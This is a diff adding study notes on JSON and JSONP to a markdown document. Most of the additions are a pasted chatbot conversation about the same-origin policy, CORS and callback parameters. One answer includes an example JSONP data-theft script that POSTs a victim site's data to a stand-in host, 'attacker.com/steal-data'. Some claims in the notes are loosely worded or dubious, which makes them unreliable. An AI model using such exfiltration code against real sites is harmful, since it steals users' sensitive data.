@@ -30,6 +30,9 @@
     - [Use a single root element](#use-a-single-root-element)
     - [Use meaningful keys](#use-meaningful-keys)
   - [Meaning of `application/json` in the context of APIs (MIME types)](#meaning-of-applicationjson-in-the-context-of-apis-mime-types)
+  - [Why are comments not allowed in JSON?](#why-are-comments-not-allowed-in-json)
+- [JSONP (TODO)](#jsonp-todo)
+  - [Can servers disallow jsonp?](#can-servers-disallow-jsonp)
 - [`cURL` command explained](#curl-command-explained)
 - [Server-Side API Caching](#server-side-api-caching)
 
@@ -360,6 +363,118 @@ There are alternative media types that can be used in APIs, depending on the spe
 - `text/plain`: Indicates that the data is plain text, with no specific formatting.
 
 It's worth noting that while different media types can be used in APIs, `application/json` is a very common choice due to its simplicity, support for a wide range of data types, and widespread support in programming languages and tooling.
+
+## Why are comments not allowed in JSON?
+
+Comments are not allowed in JSON because the JSON format was designed to be a lightweight data interchange format, and allowing comments would add unnecessary complexity and make it more difficult to parse. 
+
+JSON was derived from JavaScript object notation, which does support comments, but the creators of JSON intentionally removed this feature to make it a more strict and unambiguous format for data exchange.
+
+---
+
+# JSONP (TODO)
+
+what is jsonp
+JSONP (JSON with Padding) is a technique used to overcome the same-origin policy limitations of web browsers when loading data from a different domain. The same-origin policy is a security feature that prevents a web page from making requests to a different domain than the one that served the web page.
+
+JSONP works by adding a script tag to the web page, with the src attribute set to the URL of the JSON data on the other domain. The server providing the JSON data wraps the data in a JavaScript function call, and the browser executes the script as if it were any other script on the page, allowing the JSON data to be accessed.
+
+JSONP is generally considered less secure than other methods for loading data from a different domain, such as CORS (Cross-Origin Resource Sharing), and it is not recommended to use it in new developments. JSONP is mainly used in legacy codebase and it is not supported by all browsers.
+
+
+
+Rohan Verma
+how exactly does jsonp work
+JSONP works by adding a script tag to the web page, with the src attribute set to the URL of the JSON data on the other domain. The browser then sends a request to the server for the JSON data, but instead of returning the data in the usual JSON format, the server wraps the data in a JavaScript function call.
+
+When the browser receives the response, it treats it as a script and executes the function call. The JSON data is passed as an argument to the function, and is available to the web page's JavaScript code.
+
+For example, if a web page wants to load JSON data from a server at "http://example.com/data.json", it would add a script tag to the page with the src attribute set to "http://example.com/data.json?callback=parseData". The server would then return the JSON data wrapped in a function call like this: "parseData({'key':'value'});"
+
+When the browser receives this response, it would execute the parseData function and pass the JSON data to it. The parseData function can then access the JSON data and use it as needed.
+
+JSONP is mainly used for loading data from a different domain, where it is not possible to use XMLHttpRequest or similar techniques due to the same-origin policy limitations. However, it's important to note that JSONP is less secure than other methods such as CORS, because it allows arbitrary script to be executed in the user's browser, thus it is not recommended to use it in new developments.
+
+
+
+
+Rohan Verma
+How does JSONP not violate same origin policy
+JSONP does not violate the same-origin policy because the data is not being accessed directly by the web page's JavaScript code. The same-origin policy prevents a web page from making requests to a different domain than the one that served the web page. However, JSONP works by adding a script tag to the web page, with the src attribute set to the URL of the JSON data on the other domain. This is allowed by the same-origin policy because a script tag is considered a safe method of including resources from other domains.
+
+When the browser receives the response containing the JSONP wrapped data, it treats it as a script and executes the function call. The JSON data is passed as an argument to the function, and is available to the web page's JavaScript code.
+
+However, it's important to note that JSONP is less secure than other methods such as CORS, because it allows arbitrary script to be executed in the user's browser. JSONP is mainly used for loading data from a different domain, and it is not recommended to use it in new developments, CORS is a more secure way and is supported by most of the browser.
+
+
+
+
+Rohan Verma
+Example of javascript that same origin policy will block
+An example of JavaScript that would be blocked by the same-origin policy would be a script that attempts to make an XMLHttpRequest (or similar) to a different domain than the one that served the web page.
+
+For example, if a web page is served from "http://example.com", a script on that page that attempts to make an XMLHttpRequest to "http://other-domain.com/data.json" would be blocked by the browser due to the same-origin policy.
+
+Here's an example of a JavaScript code that would be blocked by the same-origin policy:
+
+Copy code
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "http://other-domain.com/data.json", true);
+xhr.send();
+This script attempts to make a GET request to "http://other-domain.com/data.json" using the XMLHttpRequest object, but the browser would block the request because "http://other-domain.com" is a different domain than "http://example.com" which served the web page.
+
+However, if the script uses JSONP, it will be able to load the data, because JSONP uses script tags which are allowed by the same-origin policy.
+
+
+
+
+Rohan Verma
+Example of malicious js code that uses jsonp
+Here is an example of malicious JavaScript code that uses JSONP to exploit a vulnerability on a website:
+
+Copy code
+// The attacker's server
+function attackerCode(data) {
+  // Send the data to the attacker's server
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "http://attacker.com/steal-data", true);
+  xhr.send(data);
+}
+
+// The malicious code
+var script = document.createElement("script");
+script.src = "http://vulnerable-site.com/data.json?callback=attackerCode";
+document.body.appendChild(script);
+This script creates a script tag that points to a JSONP endpoint on "http://vulnerable-site.com", and sets the callback function to be the attackerCode function. When the browser loads the script, it will execute the attackerCode function, which will send the data from the vulnerable site to the attacker's server.
+
+This type of attack is possible because JSONP allows arbitrary JavaScript code to be executed in the user's browser, and it can be used to steal sensitive information from the user, such as session cookies, login credentials, and other sensitive data. It's important to note that JSONP is less secure than other methods such as CORS, and it is not recommended to use it in new developments.
+
+
+
+
+Rohan Verma
+callback query parameter
+!
+The callback query parameter is used in JSONP to specify the callback function that will be executed when the browser receives the JSON data. When making a JSONP request, the callback function is passed as a query parameter to the URL of the JSON data. The server then wraps the JSON data in a call to the specified callback function, and the browser executes the function call.
+
+For example, if a web page wants to load JSON data from a server at "http://example.com/data.json", it would add a script tag to the page with the src attribute set to "http://example.com/data.json?callback=parseData". The server would then return the JSON data wrapped in a function call like this: "parseData({'key':'value'});"
+
+When the browser receives this response, it would execute the parseData function and pass the JSON data to it. The parseData function can then access the JSON data and use it as needed.
+
+It's important to note that the use of callback query parameter does not guarantee security, and JSONP can be used to steal sensitive information from the user, such as session cookies, login credentials, and other sensitive data. It's recommended to use other methods such as CORS, which is more secure and it is supported by most of the browser.
+
+This content may violate our content policy. If you believe this to be in error, please submit your feedback — your input will aid our research in this area.
+
+
+## Can servers disallow jsonp?
+
+Yes, websites can disallow JSONP requests by not including the necessary code on the server to handle the callback query parameter.
+
+For example, the server could be configured to only respond to requests that do not include a callback query parameter, or it could be programmed to check the origin of the request and only allow requests from specific domains. This would prevent a malicious script from making a JSONP request to the site and executing malicious code.
+
+Another way to disallow JSONP requests is to use the ***Content Security Policy*** (CSP) header. CSP is a security feature that allows a site to specify which sources of content are allowed to be loaded by a browser. CSP can be used to block the loading of scripts from specific domains, or block the use of the callback query parameter altogether.
+
+It's important to note that JSONP is less secure than other methods such as CORS, and it is not recommended to use it in new developments. Disallowing JSONP requests can help to prevent security vulnerabilities and protect sensitive user data.
 
 ---
 
